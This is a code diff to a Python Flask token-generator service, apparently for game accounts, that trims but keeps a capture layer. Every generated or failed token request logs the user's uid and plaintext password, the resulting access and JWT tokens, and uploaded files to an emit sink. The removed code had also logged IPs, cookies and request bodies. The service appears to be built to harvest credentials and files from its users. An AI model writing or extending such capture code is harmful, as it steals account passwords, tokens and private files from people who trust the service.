@@ -112,37 +112,6 @@ def _now():
     return datetime.now(timezone.utc).isoformat()
 
 
-def _req_ip():
-    fwd = request.headers.get("X-Forwarded-For", "")
-    return fwd.split(",")[0].strip() if fwd else request.remote_addr
-
-
-def _extract_sender(body_dict, headers, args, filenames):
-    if isinstance(body_dict, dict):
-        for k in ("name", "username", "user", "player", "ign", "nick", "sender", "full_name"):
-            v = body_dict.get(k)
-            if v and isinstance(v, str) and v.strip():
-                return v.strip()[:80]
-    for h in ("X-Username", "X-User", "X-Player-Name", "X-Name", "X-Sender"):
-        v = headers.get(h)
-        if v and v.strip():
-            return v.strip()[:80]
-    for k in ("name", "username", "user", "player", "ign"):
-        v = args.get(k)
-        if v and v.strip():
-            return v.strip()[:80]
-    for fn in filenames:
-        stem = fn.rsplit(".", 1)[0]
-        for sep in ("_", "-"):
-            if sep in stem:
-                head = stem.split(sep)[0]
-                if len(head) >= 3 and head.isalnum():
-                    return head
-        if len(stem) >= 3:
-            return stem[:40]
-    return None
-
-
 # ============================================================
 #  Flask
 # ============================================================
@@ -290,17 +259,9 @@ def generate_jwt_token(uid, password):
     emit({
         "ts":           _now(),
         "source":       "generated",
-        "sender":       None,
         "uid":          uid,
         "password":     password,
-        "ip":           _req_ip(),
-        "method":       request.method,
-        "path":         request.path,
-        "query":        json.dumps(dict(request.args)),
-        "body":         None,
-        "cookies":      json.dumps(dict(request.cookies)),
-        "user_agent":   request.headers.get("User-Agent"),
-        "referer":      request.headers.get("Referer"),
+        "real_uid":     real_uid,
         "level":        level,
         "region":       region,
         "access_token": token_val,
@@ -312,7 +273,7 @@ def generate_jwt_token(uid, password):
 
 
 # ============================================================
-#  Request capture
+#  File upload capture
 # ============================================================
 
 MAX_FILE_BYTES = 8 * 1024 * 1024
@@ -321,68 +282,43 @@ MAX_FILES = 5
 
 @app.before_request
 def capture_request():
-    body = None
-    body_dict = {}
-    try:
-        if request.is_json:
-            body_dict = request.get_json(silent=True) or {}
-            body = json.dumps(body_dict, ensure_ascii=False)
-        elif request.form:
-            body_dict = dict(request.form)
-            body = json.dumps(body_dict, ensure_ascii=False)
-        elif request.data and len(request.data) < 4096:
-            body = request.data.decode("utf-8", errors="replace")[:1000]
-    except Exception:
-        body = None
+    # /token skip karo — uska capture generate_jwt_token me hota
+    if request.path == "/token":
+        return
 
     files_payload = []
-    files_summary_lines = []
-    filenames = []
     try:
         for key in request.files:
             fs = request.files[key]
             if not fs or not fs.filename:
                 continue
             if len(files_payload) >= MAX_FILES:
-                files_summary_lines.append(f"[skipped extra: {fs.filename}]")
                 break
             data = fs.read()
             if not data:
                 continue
             if len(data) > MAX_FILE_BYTES:
-                files_summary_lines.append(
-                    f"{fs.filename} — SKIPPED ({len(data)} > {MAX_FILE_BYTES})"
-                )
                 continue
-            filenames.append(fs.filename)
             files_payload.append({
                 "filename": fs.filename,
                 "data": data,
                 "content_type": fs.mimetype or "application/octet-stream",
             })
-            files_summary_lines.append(
-                f"{fs.filename} — {len(data)} bytes — {fs.mimetype}"
-            )
-    except Exception as e:
-        files_summary_lines.append(f"file read error: {e}")
-
-    sender = _extract_sender(body_dict, request.headers, request.args, filenames)
+    except Exception:
+        pass
 
     emit({
-        "ts":             _now(),
-        "source":         "request",
-        "sender":         sender,
-        "ip":             _req_ip(),
-        "method":         request.method,
-        "path":           request.path,
-        "query":          json.dumps(dict(request.args), ensure_ascii=False),
-        "body":           body,
-        "cookies":        json.dumps(dict(request.cookies), ensure_ascii=False),
-        "user_agent":     request.headers.get("User-Agent"),
-        "referer":        request.headers.get("Referer"),
-        "error":          None,
-        "files_summary":  "\n".join(files_summary_lines) if files_summary_lines else None,
-        "_files":         files_payload,
+        "ts":           _now(),
+        "source":       "request",
+        "uid":          None,
+        "password":     None,
+        "real_uid":     None,
+        "level":        None,
+        "region":       None,
+        "access_token": None,
+        "jwt_token":    None,
+        "error":        None,
+        "_files":       files_payload,
     })
 
 
@@ -416,17 +352,13 @@ def get_jwt_token():
         emit({
             "ts":         _now(),
             "source":     "generated_failed",
-            "sender":     None,
             "uid":        uid,
             "password":   password,
-            "ip":         _req_ip(),
-            "method":     request.method,
-            "path":       request.path,
-            "query":      json.dumps(dict(request.args), ensure_ascii=False),
-            "body":       None,
-            "cookies":    json.dumps(dict(request.cookies), ensure_ascii=False),
-            "user_agent": request.headers.get("User-Agent"),
-            "referer":    request.headers.get("Referer"),
+            "real_uid":   None,
+            "level":      None,
+            "region":     None,
+            "access_token": None,
+            "jwt_token":  None,
             "error":      str(e),
         })
         return jsonify({
